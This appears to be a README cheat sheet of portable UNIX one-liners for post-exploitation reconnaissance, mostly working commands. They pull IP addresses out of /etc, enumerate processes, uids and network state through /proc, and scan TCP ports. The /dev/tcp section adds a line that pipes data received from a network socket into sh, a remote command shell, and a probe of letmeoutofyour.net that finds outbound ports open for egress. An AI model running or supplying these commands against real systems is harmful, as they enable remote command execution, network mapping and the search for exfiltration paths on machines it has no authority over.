# lcdbins

An **lcdbin** is a lowest-common denominator binary; a platform-agnostic oneliner that should work on almost any UNIX environment. The liners documented here should work on any UNIX environment, except where otherwise specified. Some liners may not work on environments that are missing standard utilities such as bc.

Greetz to moogz for assistance and contributions.

## Universal Oneliners

Get all IP addresses in /etc/

```shell
grep -ro '[0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}' /etc/* 2>/dev/null
grep -Ero '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b' /etc/* 2>/dev/null
```

## /proc

Get kernel version information

```shell
cat /proc/version
cat /proc/sys/kernel/version
```

Get hostname

```shell
cat /proc/sys/kernel/hostname
```

Get current uid and gid

```shell
uid=$(cat /proc/self/status | grep -i '^uid:' | awk -F '[ \t]' '{print $2}'); gid=$(cat /proc/self/status | grep -i '^gid:' | awk -F '[ \t]' '{print $2}'); echo uid $uid gid $gid
```

List information about processes

```
echo PID NAME UID GID; pids=$(ls /proc | grep '^[0-9]*$'); for pid in $pids; do name=$(cat /proc/$pid/status 2> /dev/null | grep -i '^name' | awk -F '[ \t]' '{print $2}'); uid=$(cat /proc/$pid/status 2> /dev/null | grep -i '^uid:' | awk -F '[ \t]' '{print $2}'); gid=$(cat /proc/$pid/status 2> /dev/null | grep -i '^gid:' | awk -F '[ \t]' '{print $2}'); echo $pid $name $uid $gid; done;
```

Parse listening ports on /proc/net/tcp

```shell
for i in $(grep " 0A " /proc/net/tcp | awk -F "[ :]+" '{print $4}'); do echo "obase=10; ibase=16; $i" | bc; done | sort -un
```

Parse destination and gateway from /proc/net/route

```shell
echo Interface Destination Gateway; awk "NR >= 2" /proc/net/route |while read line; do printf '%s %d.%d.%d.%d %d.%d.%d.%d\n' $(echo $line | awk -F ' ' '{print $1}') $(echo $line | awk -F ' ' '{print $2}' | sed "s/../0x& /g" | awk '{ for (i=NF; i>1; i--) printf("%s ",$i); print $1; }') $(echo $line | awk -F ' ' '{print $3}' | sed "s/../0x& /g" | awk '{ for (i=NF; i>1; i--) printf("%s ",$i); print $1; }'); done
```

## /dev/tcp (requires bash)

Connect to a port and execute the command received

```shell
exec 3<>/dev/tcp/127.0.0.1/31337; cat <&3 | sh
```

Use letmeoutofyour.net to check firewall ACLs for a port

```shell
exec 3<>/dev/tcp/letmeoutofyour.net/31337; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3 | grep w00tw00t
```

Use dyndns.org to find your public IP address

```shell
exec 3<>/dev/tcp/checkip.dyndns.org/80; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3
```

Scan TCP ports

```shell
for i in {1..9000}; do SERVER="127.0.0.1"; PORT=$i; (echo  > /dev/tcp/$SERVER/$PORT) &> /dev/null && echo "Port $PORT seems to be open"; done
```
